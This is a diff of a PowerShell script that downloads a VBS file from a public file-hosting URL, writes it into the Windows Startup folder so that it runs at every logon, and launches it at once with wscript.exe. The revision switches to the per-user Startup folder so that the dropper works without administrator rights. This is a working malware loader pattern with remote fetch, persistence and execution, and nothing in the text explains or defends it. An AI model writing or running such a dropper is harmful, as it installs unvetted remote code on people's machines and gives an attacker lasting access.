@@ -1,25 +1,13 @@
+# Define URL of the VBS file
 $url = "https://files.catbox.moe/eqlsi1.vbs"
 
-$destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\eqlsi1.vbs"
-$localAppData = $env:LOCALAPPDATA
-$destination2 = Join-Path $localAppData "eqlsi1.vbs"
+# Get current user's startup folder (no admin needed)
+$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\eqlsi1.vbs"
 
-# Download to both locations
-Invoke-WebRequest -Uri $url -OutFile $destination1
-Invoke-WebRequest -Uri $url -OutFile $destination2
+# Download the VBS file to the startup folder
+Invoke-WebRequest -Uri $url -OutFile $startupPath
 
-# Function to check for admin rights
-function Is-Admin {
-    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    return $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-}
-
-if (Is-Admin) {
-    # Running as admin - start script from destination1
-    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination1`"" -NoNewWindow
-} else {
-    # Not admin - start script from destination2
-    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination2`"" -NoNewWindow
-}
+# Optionally run it immediately (in background)
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWindow
 
 exit
